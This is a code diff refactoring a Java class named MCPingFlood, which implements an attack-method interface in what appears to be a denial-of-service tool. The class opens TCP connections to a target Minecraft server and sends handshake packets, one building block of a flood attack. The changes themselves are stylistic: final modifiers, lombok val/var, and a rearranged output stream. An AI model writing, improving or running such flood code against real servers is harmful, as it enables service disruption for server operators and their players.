@@ -4,6 +4,7 @@ import ir.xenoncommunity.jss.methods.IAttackMethod;
 import ir.xenoncommunity.jss.utils.AttackStatics;
 import ir.xenoncommunity.jss.utils.SocketUtils;
 import lombok.RequiredArgsConstructor;
+import lombok.val;
 
 import java.io.ByteArrayOutputStream;
 import java.io.DataOutputStream;
@@ -26,29 +27,28 @@ public class MCPingFlood implements IAttackMethod {
      * @throws Exception If an error occurs during the sending process
      */
     @Override
-    public void send(InetAddress addr, int port) throws Exception {
+    public void send(final InetAddress addr, final int port) throws Exception {
         // Check if the limit is reached
         if (statics.isLimitReached()) return;
 
-        try (Socket socket = new Socket(addr, port);
-             DataOutputStream outputStream = new DataOutputStream(socket.getOutputStream());
-             ByteArrayOutputStream buffer = new ByteArrayOutputStream();
-             DataOutputStream bufferStream = new DataOutputStream(buffer)) {
+        try (val socket = new Socket(addr, port);
+             val buffer = new ByteArrayOutputStream();
+             val bufferStream = new DataOutputStream(buffer)) {
 
-            // If the socket is not connected, return
-            if (!socket.isConnected()) return;
+                // If the socket is not connected, return
+                if (!socket.isConnected()) return;
 
-            // Enable socket options
-            SocketUtils.enableSocketOpts(socket,
-                    StandardSocketOptions.TCP_NODELAY,
-                    StandardSocketOptions.SO_KEEPALIVE);
-            // Set socket timeout
-            SocketUtils.setSoTimeout(socket, 1000);
+                // Enable socket options
+                SocketUtils.enableSocketOpts(socket,
+                        StandardSocketOptions.TCP_NODELAY,
+                        StandardSocketOptions.SO_KEEPALIVE);
+                // Set socket timeout
+                SocketUtils.setSoTimeout(socket, 1000);
 
-            // Write handshake data to the buffer
-            writeHandshake(bufferStream, addr, port);
-            // Write buffer to the output stream
-            writePacket(outputStream, buffer);
+                // Write handshake data to the buffer
+                writeHandshake(bufferStream, addr, port);
+                // Write buffer to the output stream
+                writePacket(new DataOutputStream(socket.getOutputStream()), buffer);
         }
     }
 
@@ -60,7 +60,7 @@ public class MCPingFlood implements IAttackMethod {
      * @param port         The server port
      * @throws IOException If an I/O error occurs
      */
-    private void writeHandshake(DataOutputStream bufferStream, InetAddress addr, int port) throws IOException {
+    private void writeHandshake(final DataOutputStream bufferStream, final InetAddress addr, final int port) throws IOException {
         writeVarInt(bufferStream, 0x00); // Writing packet ID
         writeVarInt(bufferStream, 754); // Writing protocol version
         writeString(bufferStream, addr.getHostAddress()); // Writing server address
@@ -76,7 +76,7 @@ public class MCPingFlood implements IAttackMethod {
      * @param buffer       the buffer containing the data to write
      * @throws IOException if an I/O error occurs
      */
-    private void writePacket(DataOutputStream outputStream, ByteArrayOutputStream buffer) throws IOException {
+    private void writePacket(final DataOutputStream outputStream, final ByteArrayOutputStream buffer) throws IOException {
         outputStream.write(buffer.toByteArray());
         outputStream.flush();
     }
@@ -88,10 +88,10 @@ public class MCPingFlood implements IAttackMethod {
      * @param value the integer value to write
      * @throws IOException if an I/O error occurs
      */
-    private void writeVarInt(DataOutputStream out, int value) throws IOException {
+    private void writeVarInt(final DataOutputStream out, int value) throws IOException {
         do {
             // Extract the lowest 7 bits of the value
-            byte temp = (byte) (value & 0b01111111);
+            var temp = (byte) (value & 0b01111111);
             // Shift the value to the right by 7 bits
             value >>>= 7;
             // If there are still more bits in the value, set the highest bit in temp
@@ -110,9 +110,9 @@ public class MCPingFlood implements IAttackMethod {
      * @param string the string to write
      * @throws IOException if an I/O error occurs
      */
-    private void writeString(DataOutputStream out, String string) throws IOException {
+    private void writeString(final DataOutputStream out, final String string) throws IOException {
         // Convert the string to bytes using UTF-8 encoding
-        byte[] bytes = string.getBytes(StandardCharsets.UTF_8);
+        val bytes = string.getBytes(StandardCharsets.UTF_8);
 
         // Write the length of the byte array as a minecraft varint
         writeVarInt(out, bytes.length);
